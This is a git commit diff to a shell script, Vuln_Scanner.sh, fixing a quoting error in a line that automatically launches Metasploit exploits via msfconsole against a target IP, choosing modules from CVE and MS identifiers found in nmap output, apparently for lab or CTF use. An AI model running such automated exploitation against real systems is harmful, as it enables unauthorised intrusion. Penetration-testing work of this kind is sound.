ec8981cbc76c235abc169d72638a1c00f4d41f35
HarveyGW <45942623+HarveyGW@users.noreply.github.com>
2023-03-09 17:27:16 +0000

    Update Vuln_Scanner.sh

--- Vuln_Scanner.sh
+++ Vuln_Scanner.sh
@@ -157,6 +157,6 @@ then
         exploitPath=$(echo "$line" | cut -d ":" -f 1)
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
-        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit -j; exit;""
+        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit -j; exit;"
     done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
 fi
